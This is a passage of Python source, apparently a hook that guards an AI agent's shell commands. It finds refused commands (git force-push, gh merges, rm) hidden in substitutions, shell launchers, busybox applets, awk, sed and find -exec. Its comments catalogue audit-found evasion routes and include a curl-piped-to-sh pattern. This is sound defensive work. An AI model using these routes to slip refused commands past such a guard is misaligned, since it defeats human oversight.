        if ch == "$" and text[i + 1:i + 2] == SQ and not (in_sq or in_dq or param_quoted):
            in_sq = ansi = True
            i += 2
            continue
        if ch == SQ and not in_dq and not param_quoted:
            in_sq, ansi = not in_sq, False
        elif ch == DQ and not in_sq:
            in_dq = not in_dq
        elif not (in_sq or in_dq or contexts) and ch == "#" and (i == 0 or text[i - 1] in " " + chr(9) + chr(10) + ";|&("):
            nl = text.find(chr(10), i)
            i = n if nl < 0 else nl
            continue
        elif not in_sq and text[i:i + 2] == "${" and text[i + 2:i + 3] in (" ", chr(9), chr(10), "|"):
            # ${ cmd; } and ${| cmd; } run cmd in the current shell (bash 5.3, ksh93): a command
            # substitution by another spelling, judged as one (#598). Older bash calls it a bad
            # substitution, so judging it refuses no command that works there.
            j = _brace_end(text, i + 2)
            out.append(text[i + 3 if text[i + 2] == "|" else i + 2:j - 1])
            surface.append(text[surface_start:i] + _sub_mark(out[-1]))
            surface_start = i = j
            continue
        elif not in_sq and text[i:i + 2] in ("${", "$["):
            opening = text[i + 1]
            quoted = in_dq or bool(param and param["quoted"])
            meta = {"quoted": quoted, "mode": None, "brackets": 0, "name": False} if opening == "{" else None
            contexts.append([opening, "}" if opening == "{" else "]", 1, in_sq, in_dq, meta])
            in_sq = in_dq = False
            i += 2
            continue
        elif not in_sq and text.startswith("$((", i):
            contexts.append(["(", ")", 2, in_sq, in_dq, None])
            in_sq = in_dq = False
            i += 3
            continue
        elif not (in_sq or in_dq) and text.startswith("((", i) and (not contexts or contexts[-1][0] == "("):
            contexts.append(["(", ")", 2, in_sq, in_dq, None])
            i += 2
            continue
        elif contexts and not (in_sq or in_dq) and ch in contexts[-1][:2]:
            # Only ${ opens a nested parameter expansion; a plain { is data.
            if ch != "{" or contexts[-1][0] != "{":
                contexts[-1][2] += 1 if ch == contexts[-1][0] else -1
            if contexts[-1][2] == 0:
                _open, _close, _level, in_sq, in_dq, _meta = contexts.pop()
        elif _stop_paren and not (in_sq or in_dq or contexts) and ch in "()" \
                and not (ch == ")" and case_depth and paren_level == 1):
            paren_level += 1 if ch == "(" else -1
            if paren_level == 0:
                return positions[i] + 1, True
        elif not (in_sq or in_dq or contexts) and ch in "[]":
            if bracket_kind == "conditional":
                if text.startswith("]]", i):
                    brackets, bracket_kind = 0, ""
                    i += 2
                    continue
            elif brackets:
                brackets += 1 if ch == "[" else -1
                if not brackets:
                    bracket_kind = ""
            elif ch == "[":
                bracket_kind = _bracket_expression("".join(surface) + text[surface_start:i], text, i)
                brackets = 2 if bracket_kind == "conditional" else int(bracket_kind == "array")
                if bracket_kind == "conditional":
                    i += 2
                    continue
        elif not in_sq and ch == chr(96):
            j = i + 1
            while j < n and text[j] != chr(96):
                j += 2 if text[j] == chr(92) else 1
            out.append(_backtick_body(text[i + 1:j], in_dq))
            surface.append(text[surface_start:i] + _sub_mark(out[-1]))
            surface_start = j + 1
            i = j
        elif not (in_sq or in_dq or contexts) and text.startswith("<<", i):
            if brackets:
                raise ValueError("ambiguous bracketed shift or redirection")
            if text.startswith("<<<", i):
                i += 3  # a here-string expands as an ordinary shell word
            else:
                op_start = i
                delim, i = _heredoc_delim(text, i)
                if _stop_paren and not delim[0]:
                    raise ValueError("unsupported empty nested heredoc delimiter")
                pending.append((delim, op_start, i))
            continue
        elif not in_sq and ch in "$<>" and text[i + 1:i + 2] == "(":
            if ch != "$" and (in_dq or param_quoted):
                i += 1
                continue  # <(...) inside double quotes is literal text
            j, closed = _balanced_paren_end(text, i + 2)
            out.append(text[i + 2:j - 1] if closed else text[i + 2:])
            surface.append(text[surface_start:i] + _sub_mark(out[-1]))
            surface_start = j
            i = j - 1
        i += 1
    if contexts:
        raise ValueError("unclosed shell expansion context")
    if _stop_paren:
        return source_length, False
    if depth < 4 and flat:
        analyzed = []
        for body in out:
            nested, inner_surface, nested_patches, nested_docs = substitution_bodies(body, depth + 1)
            analyzed += [inner_surface] + nested
            patches += nested_patches
            docs += nested_docs
        out = analyzed
    return [b for b in out if b.strip()], "".join(surface) + text[surface_start:], patches, docs


def _tokenize(seg):
    args, writes, pending = [], [], None
    for kind, value in shell_tokens(seg):
        if kind == "redirect":
            pending = value
        elif pending:
            if pending in (">", ">>", ">|", ">&", "&>", "&>>", "<>"):
                writes.append(value)
            pending = None
        else:
            args.append(value)
    return args, writes


# hush is the busybox shell applet (2026-10-29 audit, F2).
_SHELLS = ("sh", "bash", "zsh", "dash", "ksh", "mksh", "ash", "yash", "posh", "hush")
# Interpreters that run code straight from argv, and the option letters that carry it. awk has
# no code flag -- its program is the first non-option word (-f takes a file) -- and deno takes a
# code operand after its `eval` subcommand, so both are read in _inline_code own branches,
# not here (W1-03, 2026-10-27 audit).
_INLINE_FLAGS = {"python": "c", "perl": "eE", "ruby": "e", "node": "ep", "nodejs": "ep",
                 "bun": "e", "php": "r", "lua": "e", "luajit": "e", "julia": "eE", "Rscript": "e",
                 "R": "e"}
_AWKS = ("awk", "gawk", "mawk", "nawk")
# busybox <applet> ARGS runs the applet: peel it so `busybox awk …` is judged as awk (W1-03/W1-05).
# toybox is the same multi-call shape.
# Every shell applet too: busybox bash -c and toybox sh -c run a shell (2026-10-29 audit, F2).
_BUSYBOX_APPLETS = set(_AWKS) | set(_SHELLS) | {"sed", "tar", "unzip", "cpio", "rm", "rmdir", "cp",
                                 "mv", "dd", "tee", "wget", "vi", "ln", "install", "chmod"}


def _is_awk(head):
    """Any awk build: awk/gawk/mawk/nawk/goawk/original-awk, etc. (re-attacker g1 #1)."""
    return head in _AWKS or head in ("goawk", "original-awk") or bool(re.fullmatch(r"[a-z]*awk", head))


def _canon_interp(head):
    """Canonical _INLINE_FLAGS key for a versioned or variant interpreter spelling (g1 #1):
    python3.12 -> python, lua5.4 -> lua, luajit2.1 -> luajit, ruby3 -> ruby, R -> R."""
    for pat, key in ((r"python[0-9.]*", "python"), (r"luajit[0-9.]*", "luajit"),
                     (r"lua[0-9.]*", "lua"), (r"ruby[0-9.]*", "ruby"), (r"php[0-9.]*", "php"),
                     (r"perl[0-9.]*", "perl")):
        if re.fullmatch(pat, head):
            return key
    return head


def _peel_busybox(head, rest):
    """(head, rest) with a leading busybox/toybox applet peeled: busybox awk PROG -> awk PROG.
    A leading --install (and its -s) is skipped first (#740): busybox --install sh -c BODY is
    judged as sh -c BODY, which fails closed. Without an applet after them nothing is peeled,
    so busybox --install -s DIR keeps its decision."""
    if head in ("busybox", "busybox.static", "toybox"):
        opts = list(rest[:2])
        skip = 2 if opts == ["--install", "-s"] else 1 if opts[:1] == ["--install"] else 0
        if len(rest) > skip and rest[skip] in _BUSYBOX_APPLETS:
            return rest[skip], rest[skip + 1:]
    return head, rest


def _peel_shell(ws):
    """ws with a busybox/toybox front peeled when the applet it runs is a shell (2026-10-29
    audit, F2): busybox sh -c BODY runs BODY exactly as sh -c BODY does, so its -c string, its
    heredoc and its script operand are read as the shell reads them. Other applets keep their
    front here; the places that judge them peel it themselves (awk, sed, tar, ...)."""
    if ws:
        head, rest = _peel_busybox(ws[0].rsplit("/", 1)[-1], ws[1:])
        if head in _SHELLS and len(rest) < len(ws) - 1:
            return [head] + list(rest)
    return ws
_CODE_LITERAL = re.compile(r"\x22((?:[^\x22\\]|\\.)*)\x22|\x27([^\x27]*)\x27", re.DOTALL)
_CODE_WRITES = re.compile(r"write|unlink|remove|rmtree|rmdir|rename|replace|chmod|chown|truncate"
                          r"|symlink|link|copy|move|system|popen|spawn|exec|subprocess|FileUtils"
                          r"|rmSync|>|open[^)]*[\x22\x27][rbt]*[wax+]")
# Heads a command built from an expansion is judged as when its value cannot be read (#598).
_REFUSED_HEADS = ("gh", "git", "rm", "orca")
# What the reader writes for text it cannot resolve (#654): it reads as an expansion, so a head
# holding it takes the refused-head fallback in _head_bodies rather than passing as complete.
_UNRESOLVED = "${__OPEN_FLEET_UNRESOLVED__}"
_ASSIGNED = {}   # NAME -> the literal values this command line assigns it, anywhere (#598)
_SIMPLE_VAR = re.compile(r"\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*))")
_DECLARERS = ("export", "declare", "typeset", "local", "readonly")
_FED_SUB = []    # set when a substitution feeds a shell on stdin: echo "$(curl ...)" | sh
_FED_INTERP = []  # interpreter programs fed on stdin (python3 <<EOF ...): judged for guard writes
_FED_BLIND = []   # shell stages whose stdin program the hook cannot read (ro floor only, W4-05)
# Launchers outside the peel table: each runs a -c string, a vector after operands of its own,
# or a string it hands to a shell (_launcher_bodies, #598).
_BODY_LAUNCHERS = ("su", "runuser", "flock", "script", "watch", "parallel", "ssh", "find", "fd",
                   "fdfind", "entr", "repeat")
_PARALLEL_LONG = ("--jobs", "--max-procs", "--sshlogin", "--sshloginfile", "--slf", "--arg-file",
                  "--delimiter", "--eof", "--max-args", "--max-lines", "--max-chars", "--colsep",
                  "--tmpdir", "--joblog", "--results", "--res", "--workdir", "--wd", "--timeout",
                  "--delay", "--retries", "--env", "--halt", "--memfree", "--load", "--nice",
                  "--tagstring", "--basefile", "--bf", "--return", "--transferfile", "--tf",
                  "--sshdelay", "--termseq", "--limit", "--rpl", "--header", "--block",
                  "--recstart", "--recend", "--compress-program", "--decompress-program",
                  "--semaphorename", "--id")
_PARALLEL_SEPS = (":::", "::::", ":::+", "::::+")


def _awk_sources(rest):
    """(inline programs, saw_program_file) for an awk command (re-attacker g1 #2, W1-03).

    awk takes its program from the first bare word, from every -e/--source[=] (which REPEAT),
    and from every -f/--file/-E/--exec program FILE. gawk runs ALL of them together, so a -f
    must never discard the -e programs already collected, in either order. -v/-F/-i/-l consume
    an operand. saw_program_file is True when any -f/-E program file is named: its contents are
    not visible here, so the program is partly unknown and the caller fails closed (HIGH)."""
    progs, saw_file, i, seen_src = [], False, 0, False
    _takes = ("-v", "--assign", "-F", "--field-separator", "-i", "--include", "-l", "--load")
    while i < len(rest):
        w = rest[i]
        if w == "--":
            if i + 1 < len(rest) and not seen_src:
                progs.append(rest[i + 1])
            break
        if w in ("-f", "--file", "-E", "--exec"):
            saw_file, seen_src = True, True
            i += 2                                          # skip the program-file operand
            continue
        if w.startswith(("--file=", "--exec=")):
            saw_file, seen_src = True, True
            i += 1
            continue
        if w in ("-e", "--source") and i + 1 < len(rest):
            progs.append(rest[i + 1])
            seen_src = True
            i += 2
            continue
        if w.startswith("--source="):
            progs.append(w.split("=", 1)[1])
            seen_src = True
            i += 1
            continue
        if w.startswith("-e") and len(w) > 2 and not w.startswith("--"):
            progs.append(w[2:])
            seen_src = True
            i += 1
            continue
        if w in _takes or w.startswith(("--assign=", "--field-separator=", "--include=",
                                        "--load=")):
            i += 2 if w in _takes else 1
            continue
        if w.startswith("-") and len(w) > 1:
            # A short cluster, walked (2026-10-29 audit, F6): the first operand-taking letter
            # takes the rest of the word, or the next word when none is left. Letters after
            # F/v/W/i/l (and after f/E) are operand text, not flags: -Ffoo is a field separator,
            # -vfs=, an assignment. f/E in flag position names a program file; e inline code.
            for k, flag in enumerate(w[1:] if not w.startswith("--") else "", 2):
                if flag in "dDLop":
                    break                                   # an optional, attached operand
                if flag in "fEeFvWil":
                    operand = w[k:]
                    if not operand and i + 1 < len(rest):
                        i += 1
                        operand = rest[i]
                    if flag in "fE":
                        saw_file, seen_src = True, True
                    elif flag == "e":
                        progs.append(operand)
                        seen_src = True
                    break
            i += 1
            continue
        if not seen_src:
            progs.append(w)                                 # the first bare word is the program
        break
    return progs, saw_file


def _awk_program_file(ws):
    """A reason when an awk command names a -f/-E program file whose contents this hook cannot
    read (W1-03, re-attacker g1 #2): the program is unknown, so a refused command could sit in
    it beside a benign inline -e. Fail closed -- unknown awk code is HIGH, never read as no code."""
    if not ws:
        return None
    head, rest = _peel_busybox(ws[0].rsplit("/", 1)[-1], ws[1:])
    if not _is_awk(head):
        return None
    if _awk_sources(rest)[1]:
        return ("awk is given a program FILE (-f/-E) this hook cannot read, so the program it "
                "runs is unknown and may launch a refused command. Inline the program with -e, "
                "or run it where the sandbox is the boundary.")
    return None


def _inline_code(head, rest):
    """The code strings an interpreter runs from argv: python -c, perl -e, node --eval, awk
    program, the operand of deno `eval`, ... (W1-03). The code is scanned by _code_commands for the
    shell lines it hands the system, so an interpreter laundering a refused command is seen."""
    head, rest = _peel_busybox(head, rest)
    if _is_awk(head):
        progs, _file = _awk_sources(rest)
        return progs
    if head == "deno":
        ops = [w for w in rest if not w.startswith("-")]
        if ops[:1] == ["eval"] and len(ops) > 1:
            return [ops[1]]
        return []
    key = _canon_interp(head)
    letters = _INLINE_FLAGS.get(key)
    codes, i = [], 0
    while letters and i < len(rest):
        w = rest[i]
        m = re.fullmatch(r"-([A-Za-z]*?)([%s])(.*)" % letters, w, re.DOTALL)
        if w in ("--eval", "--print") and i + 1 < len(rest):
            codes.append(rest[i + 1])
            i += 1
        elif m and not w.startswith("--"):
            if m[3]:
                codes.append(m[3])
            elif i + 1 < len(rest):
                codes.append(rest[i + 1])
                i += 1
            if key == "python":
                break  # -c ends the python option list
        elif key == "python" and w in ("-W", "-X", "--check-hash-based-pycs") and i + 1 < len(rest):
            i += 1  # these take a SEPARATE operand -- python -W error -c CODE -- so it is not
                    # read as the script path, which would hide the -c that follows (g1 #2)
        elif key == "python" and not w.startswith("-"):
            break  # a script path: what follows are its own arguments
        i += 1
    return codes


_EXEC_CALL = re.compile(r"(?<![A-Za-z0-9_])(system|popen|spawn[A-Za-z]*|exec[A-Za-z]*|run|call"
                        r"|check_output|check_call|Popen)[ \t]*\(")


def _call_args(code, open_paren):
    # The text inside the balanced (...) that starts at index open_paren, quotes respected.
    depth, i, quote, n = 0, open_paren, "", len(code)
    while i < n:
        ch = code[i]
        if quote:
            if ch == "\\":
                i += 2
                continue
            if ch == quote:
                quote = ""
        elif ch in (SQ, DQ):
            quote = ch
        elif ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                return code[open_paren + 1:i]
        i += 1
    return code[open_paren + 1:]


def _code_commands(code):
    """Command lines interpreter code hands to the system (PR #648 review PRRT_kwDOTWxN9c6vu_Rm):
    the string literals and the bracketed argv lists passed TO an exec-shaped call (system, popen,
    spawn, exec, run, call, Popen, a backtick), not every literal in the program -- a literal that
    is only printed, or built for another API, is data."""
    out = []
    for m in _EXEC_CALL.finditer(code):
        argtext = _call_args(code, m.end() - 1)
        # A tuple is an argv as much as a list is: run((git, push, ...)) with literals (#654).
        # A paren after a name, a dot or a closing bracket opens a CALL, not a tuple: the
        # arguments of str.format build text, they are not an argv. A word that ends the command
        # has its closing parens peeled as a subshell close, so a tuple may reach here unclosed:
        # it then runs to the end of the text.
        for lm in re.finditer(r"(?:\[|(?<![A-Za-z0-9_.\])])\()([^\[\]()]*)(?:[\])]|$)", argtext):
            items = [a or b for a, b in _CODE_LITERAL.findall(lm[1])]
            if len(items) > 1:
                out.append(shlex.join(items))
        out += [lm[1] if lm[1] is not None else lm[2] for lm in _CODE_LITERAL.finditer(argtext)]
    out += re.findall(r"\x60([^\x60]*)\x60", code)
    return [line for line in out if line.strip()]


_AWK_STR = r"(\x22(?:[^\x22\\]|\\.)*\x22|\x27[^\x27]*\x27)"
_AWK_PIPE_TOK = r"\|(?!\|)&?"   # a single `|` (not the logical `||`), optional coprocess `&`
# A string that is the command on either side of an awk pipe/coprocess: `"cmd" | getline` (before)
# and `print … | "cmd"` (after). Two passes so one match does not consume the pipe of the other.
_AWK_PIPE_BEFORE = re.compile(_AWK_STR + r"[ \t]*" + _AWK_PIPE_TOK)
_AWK_PIPE_AFTER = re.compile(_AWK_PIPE_TOK + r"[ \t]*" + _AWK_STR)


def _awk_pipe_cmds(code):
    """Shell command strings an awk program pipes to or from (re-attacker g1 #1): the output pipe
    `print … | "cmd"`, the input pipe `"cmd" | getline`, and the `|&` coprocess. The string on
    either side of a pipe may be the command (or the data fed to a shell), so both are judged."""
    out = []
    for rx in (_AWK_PIPE_BEFORE, _AWK_PIPE_AFTER):
        for m in rx.finditer(code):
            cm = _CODE_LITERAL.match(m[1])
            if cm:
                out.append(cm[1] if cm[1] is not None else cm[2])
    return [c for c in out if c and c.strip()]


def _note_assigns(assigns, ws):
    # The literal values a NAME takes on this line, so a variable used as a command is judged
    # as what it holds: c=git; $c push --force runs that push (#598). Order is not tracked --
    # every value the name is given anywhere in the command is tried, which only adds views.
    words = list(assigns)
    if ws and ws[0] in _DECLARERS:
        words += [w for w in ws[1:] if not w.startswith("-")]
    if len(ws) > 3 and ws[0] == "printf" and ws[1] == "-v":   # printf -v NAME FORMAT ARGS
        whole, unread = _printf_render(ws[3], ws[4:], False)
        views = [whole] + ([_printf_render(ws[3], ws[4:], True)[0]] if unread else [])
        words += [ws[2] + "=" + v.replace(chr(10), " ") for v in views]   # each rendering a value
    for w in words:
        m = re.fullmatch(r"([A-Za-z_][A-Za-z0-9_]*)\+?=(.*)", w, re.DOTALL)
        if m:
            _assign(m[1], m[2].replace(_QNL, " "))


def _assign(name, value):
    """Record one value NAME may hold, from NAME=value or from read NAME. Past the cap a value is
    not dropped: the name is marked unresolved, so a head built from it falls back to every
    refused head instead of reading as complete (#654)."""
    seen = _ASSIGNED.setdefault(name, set())
    if len(seen) < 8 or value in seen:
        seen.add(value)
    else:
        seen.add(_UNRESOLVED)


def _head_bodies(ws):
    """Command lines a head built from an expansion may run (#598): each literal value the line
    gives it, and -- when it cannot be read -- each refused head in its place. `$X push --force
    origin main` is a refused push for whatever X makes it one, and nothing else is judgeable."""
    head = ws[0]
    if "$" not in head and _SUB_MARK not in head and chr(96) not in head:
        return []
    heads = [head]
    for _round in range(4):
        nxt, changed = [], False
        for h in heads:
            sub = re.search(_SUB_MARK + r"([0-9]+)_", h)
            known = sub and int(sub[1]) < len(_SUB_TEXTS)
            printed = _printed(_SUB_TEXTS[int(sub[1])]) if known else None
            if printed is not None:
                # `echo CMD` as the head: the substitution prints the command that runs.
                changed = True
                nxt.append(h[:sub.start()] + printed + h[sub.end():])
                continue
            m = _SIMPLE_VAR.search(h)
            name = m and (m[1] or m[2])
            if not name or name not in _ASSIGNED:
                nxt.append(h)
                continue
            changed = True
            nxt += [h[:m.start()] + v + h[m.end():] for v in sorted(_ASSIGNED[name])]
        # Views past the cap are not dropped silently: an unresolved head stands in for them,
        # so the refused-head fallback below still runs (#654).
        heads = nxt[:16] + ([_UNRESOLVED] if len(nxt) > 16 else [])
        if not changed:
            break
    rest = (" " + shlex.join(ws[1:])) if len(ws) > 1 else ""
    lines = [h + rest for h in heads if not ("$" in h or _SUB_MARK in h or chr(96) in h)]
    if len(lines) < len(heads):
        lines += [cand + rest for cand in _REFUSED_HEADS]
    return lines


def _opt_end(rest, takes, longs=()):
    """Index just past an option run: short letters in takes and long names in longs take a
    separate operand, and -- ends the run."""
    i = 0
    while i < len(rest):
        w = rest[i]
        if w == "--":
            return i + 1
        if w.startswith("--"):
            i += 2 if "=" not in w and w in longs else 1
        elif w.startswith("-") and len(w) > 1:
            k = next((k for k, f in enumerate(w[1:]) if f in takes), None)
            i += 2 if k is not None and k == len(w) - 2 else 1
        else:
            return i
    return i


def _dash_c(rest, names):
    """The operand of the first -c (a short cluster ending in c too) or --command[=] in rest."""
    for i, w in enumerate(rest):
        if (w in names or re.fullmatch(r"-[A-Za-z]*c", w)) and i + 1 < len(rest):
            return rest[i + 1]
        for name in names:
            if name.startswith("--") and w.startswith(name + "="):
                return w.split("=", 1)[1]
    return None


def _fd_exec(w):
    return w in ("--exec", "--exec-batch") or bool(re.fullmatch(r"-[HIusigFalLp0q]*[xX]", w))


def _launcher_bodies(head, rest):
    """Command lines a launcher outside the peel table runs (#598)."""
    if head in ("su", "runuser"):
        body = _dash_c(rest, ("-c", "--command", "--session-command"))
        if body is not None:
            return [body]
        # runuser -u USER [--] COMMAND...: the command vector after the option run.
        i = _opt_end(rest, "ugGsw", ("--user", "--group", "--supp-group", "--shell",
                                     "--whitelist-environment"))
        named = any(w in ("-u", "--user") or w.startswith("--user=") for w in rest[:i])
        return [shlex.join(rest[i:])] if head == "runuser" and named and rest[i:] else []
    if head == "flock":
        body = _dash_c(rest, ("-c", "--command"))
        if body is not None:
            return [body]
        i = _opt_end(rest, "wE", ("--wait", "--timeout", "--conflict-exit-code")) + 1
        return [shlex.join(rest[i:])] if rest[i:] else []   # past the lock FILE or FD
    if head == "script":
        body = _dash_c(rest, ("-c", "--command"))
        if body is not None:
            return [body]
        ops = rest[_opt_end(rest, "tTIOBEm", ("--log-timing", "--log-in", "--log-out",
                                                "--log-io", "--echo", "--output-limit",
                                                "--logging-format")):]
        return [shlex.join(ops[1:])] if len(ops) > 1 else []   # BSD: script FILE COMMAND...
    if head == "watch":
        i = _opt_end(rest, "nq", ("--interval", "--equexit"))
        vector = any(w == "--exec" or re.fullmatch(r"-[A-Za-z]*x[A-Za-z]*", w) for w in rest[:i])
        return [shlex.join(rest[i:]) if vector else " ".join(rest[i:])] if rest[i:] else []
    if head == "parallel":
        tpl, args = rest[_opt_end(rest, "jPSadEInNLlsC", _PARALLEL_LONG):], []
        for k, w in enumerate(tpl):
            if w in _PARALLEL_SEPS:
                tpl, args = tpl[:k], [a for a in tpl[k + 1:] if a not in _PARALLEL_SEPS]
                break
        if not tpl:
            return args   # parallel ::: CMD... runs each argument as a command
        # parallel runs the template once per argument, replacing {} (and {1}, {.}, {/} …) with
        # the argument, or APPENDING it when the template has no placeholder (PR #648 review
        # PRRT_kwDOTWxN9c6vvZVr): `parallel git push {} origin main ::: --force` is a force push.
        has_ph = any(re.search(r"\{[0-9./#%]*\}", w) for w in tpl)
        out = []
        for a in args or [""]:
            filled = [re.sub(r"\{[0-9./#%]*\}", a, w) for w in tpl]
            if not has_ph and a:
                filled = filled + [a]
            out.append(" ".join(filled))
        return out
    if head == "ssh":
        takes = "BbcDEeFIiJLlmOoPpQRSWw"
        i = _opt_end(rest, takes)
        if i >= len(rest):
            return []
        j = i + 1 + _opt_end(rest[i + 1:], takes)   # past the destination
        return [" ".join(rest[j:])] if rest[j:] else []   # the remote shell parses the join
    if head in ("fd", "fdfind"):
        # fd -x/--exec runs CMD per result, -X/--exec-batch once per batch; each vector runs
        # to a ; or the end (a short-flag cluster may end in x or X: -Hx) (PR #648 review
        # PRRT_kwDOTWxN9c6vxmAh sweep).
        out, i = [], 0
        while i < len(rest):
            w = rest[i]
            if w.startswith(("--exec=", "--exec-batch=")) or _fd_exec(w):
                j = i + 1
                while j < len(rest) and rest[j] != ";":
                    j += 1
                vec = ([w.split("=", 1)[1]] if "=" in w else []) + rest[i + 1:j]
                if vec:
                    out.append(shlex.join(vec))
                i = j
            i += 1
        return out
    if head == "entr":
        # entr [-acdnprsz] UTILITY [ARG...] runs the vector on every change; -s hands its one
        # operand to a shell instead.
        i = 0
        while i < len(rest) and re.fullmatch(r"-[acdnprsz]+", rest[i]):
            i += 1
        i += rest[i:i + 1] == ["--"]
        shell = any("s" in w for w in rest[:i] if w != "--")
        return ([rest[i]] if shell else [shlex.join(rest[i:])]) if rest[i:] else []
    if head == "repeat":
        return [shlex.join(rest[1:])] if rest[1:] else []   # zsh: repeat N COMMAND...
    if head == "find":
        out, i = [], 0
        while i < len(rest):
            if rest[i] in ("-exec", "-execdir", "-ok", "-okdir"):
                j = i + 1
                while j < len(rest) and rest[j] not in (";", "+"):
                    j += 1
                if j > i + 1:
                    out.append(shlex.join(rest[i + 1:j]))
                i = j
            i += 1
        return out
    return []


def _gh_alias(ws):
    """(verb, name, expansion, runs-in-a-shell) for `gh alias ...`, else None."""
    rest, i = ws[1:], 0
    while i < len(rest) and rest[i].startswith("-"):
        i += 2 if rest[i] in _GH_OPERAND_FLAGS else 1
    if rest[i:i + 1] != ["alias"]:
        return None
    tail = rest[i + 1:]
    ops = [w for w in tail if not w.startswith("-")]
    if not ops:
        return None
    if ops[0] == "set" and len(ops) >= 3:
        shell = any(w in ("-s", "--shell") for w in tail) or ops[2].startswith("!")
        return "set", ops[1], ops[2].lstrip("!"), shell
    return ops[0], None, None, False


def _sed_s_execs(script):
    """Replacement texts of sed s/// commands that carry the `e` flag -- the substitution-execute
    form `s/.*/CMD/e` runs the substituted text through a shell (Codex g1 P1, W1-03). The flag may
    be combined (`ge`, `pe`, a numeric count) and the delimiter may be any punctuation char."""
    out, i, n = [], 0, len(script)
    while i < n:
        ch = script[i]
        if ch == "s" and i + 1 < n and not (script[i + 1].isalnum() or script[i + 1] in " \t\n"):
            delim, j, parts, cur = script[i + 1], i + 2, [], []
            while j < n and len(parts) < 2:
                c = script[j]
                if c == "\\" and j + 1 < n:
                    cur.append(script[j + 1] if script[j + 1] == delim else script[j:j + 2])
                    j += 2
                    continue
                if c == "\n":
                    break
                if c == delim:
                    parts.append("".join(cur))
                    cur = []
                    j += 1
                    continue
                cur.append(c)
                j += 1
            flags = []
            while j < n and script[j] not in " \t\n;":
                flags.append(script[j])
                j += 1
            if len(parts) == 2 and "e" in flags:
                out.append(parts[1])
            i = j
            continue
        i += 1
    return out


def _shell_launcher_lines(head, rest):
    """Shell command lines a non-interpreter tool hands to a shell by its own syntax (W1-03):
    sqlite3 `.shell`/`.system` dot-commands and sed `e <command>` / `s///e`. Not exec-call code,
    so _code_commands does not see them; read here so a command launched this way is judged.
    A sed script given with -f names a FILE this hook cannot read -- that is the on-disk-script
    limit the header already states, not covered here.
    """
    lines = []
    if head == "sqlite3":
        texts = []
        i = 0
        while i < len(rest):
            w = rest[i]
            if w in ("-cmd", "-init") and i + 1 < len(rest):
                texts.append(rest[i + 1])
                i += 2
                continue
            if not w.startswith("-"):
                texts.append(w)   # the DB name too; a bare word there is harmless to scan
            i += 1
        for text in texts:
            for ln in text.split(chr(10)):
                m = re.match(r"\s*\.(shell|system)\s+(.+)", ln)
                if m:
                    lines.append(m[2].strip())
    elif head == "sed":
        scripts, i = [], 0
        while i < len(rest):
            w = rest[i]
            if w in ("-e", "--expression") and i + 1 < len(rest):
                scripts.append(rest[i + 1])
                i += 2
                continue
            if w in ("-f", "--file", "-l", "--line-length"):
                i += 2
                continue
            if w.startswith("--expression="):
                scripts.append(w.split("=", 1)[1])
            elif w.startswith("-") and not w.startswith("--") and len(w) > 1:
                # 2026-10-29 audit, F5: walk the short cluster. The first of e/f/l takes the
                # rest of the word, or the next word when none is left (-e<SQ>e CMD<SQ> arrives
                # as -ee CMD, -ne<SQ>...<SQ> as -ne...); only e gives a script, f names a file.
                for k, flag in enumerate(w[1:], 2):
                    if flag in "efl":
                        operand = w[k:]
                        if not operand and i + 1 < len(rest):
                            i += 1
                            operand = rest[i]
                        if flag == "e":
                            scripts.append(operand)
                        break
            elif not w.startswith("-"):
                scripts.append(w)   # the first bare word is the script when no -e/-f gave one
                break
            i += 1
        for script in scripts:
            # An `e COMMAND` sed command (optionally after an address) executes COMMAND in a
            # shell. Split on newline and `;`; a leading address/label is stripped to the verb.
            for piece in re.split(r"[;\n]", script):
                m = re.match(r"\s*(?:[0-9]+|\$|/(?:[^/\\]|\\.)*/|,)*\s*e\s+(\S.*)", piece)
                if m:
                    lines.append(m[1].strip())
            lines += _sed_s_execs(script)   # the s///e substitution-execute form (g1 P1)
    return lines


# git global options that take the NEXT word as their operand (git -C DIR rebase ...).
_GIT_GLOBAL_ARG = ("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env",
                   "--super-prefix", "--attr-source")


def _git_bodies(rest):
    """Command lines a git subcommand runs by its own syntax (2026-10-29 audit, F3): git bisect
    run CMD..., git rebase -x/--exec CMD (per commit) and git submodule foreach CMD (per
    submodule). Each is a launcher, so its body is judged as segments of its own."""
    i = 0
    while i < len(rest) and rest[i].startswith("-"):
        i += 2 if rest[i] in _GIT_GLOBAL_ARG else 1
    sub, args = (rest[i], rest[i + 1:]) if i < len(rest) else ("", [])
    out = []
    if sub == "bisect":
        if args[:1] == ["run"] and args[1:]:
            out.append(shlex.join(args[1:]))   # run CMD [ARG...]: a vector, run per step
    elif sub == "rebase":
        k = 0
        while k < len(args):
            w = args[k]
            name, eq, value = w[2:].partition("=")
            if w.startswith("--") and len(name) >= 2 and "exec".startswith(name):
                # --exec, or an unambiguous prefix of it (--ex, --exe), git accepts both
                if eq:
                    out.append(value)
                elif k + 1 < len(args):
                    k += 1
                    out.append(args[k])
            elif w.startswith("-") and not w.startswith("--"):
                for j, flag in enumerate(w[1:], 2):
                    if flag in "xsX":   # each takes the rest of the word, or the next word
                        operand = w[j:]
                        if not operand and k + 1 < len(args):
                            k += 1
                            operand = args[k]
                        if flag == "x":
                            out.append(operand)
                        break
                    if flag in "SC":
                        break   # an attached, optional operand: -S<keyid>, -C<n>
            k += 1
    elif sub in ("submodule", "submodule--helper"):
        k = 0
        while k < len(args) and args[k].startswith("-"):
            k += 1   # --quiet, --cached
        if args[k:k + 1] == ["foreach"]:
            k += 1
            while k < len(args) and args[k] in ("--recursive", "--quiet", "-q", "--"):
                k += 1
                if args[k - 1] == "--":
                    break
            cmd = args[k:]
            if cmd:
                # One word is handed to a shell as a command line; several run as a vector.
                out.append(cmd[0] if len(cmd) == 1 else shlex.join(cmd))
    return out


def _inner_body(ws):
    """The command text ws runs as a command line of its own, or None.

    A shell handed a string runs it as a command line of its own, so its body is judged as
    segments of its own: `bash -c "git push --force origin main"` is that push, and
    `bash -c "gh pr merge 12"` is that send (2026-10-23 review, P1-3, P2-13). #598 widened it
    to every place a command line is deferred or relaunched: a trap action, an alias value, a
    gh shell alias, the -c string or command vector of flock, su, runuser, script, watch,
    parallel, ssh, find -exec, fd -x/-X, entr and zsh repeat, interpreter code handing a literal
    to the system, and a head built from a variable (_head_bodies). Several bodies come back one
    per line.
    """
    if not ws:
        return None
    ws = _peel_shell(ws)   # busybox sh -c / toybox sh -c (2026-10-29 audit, F2)
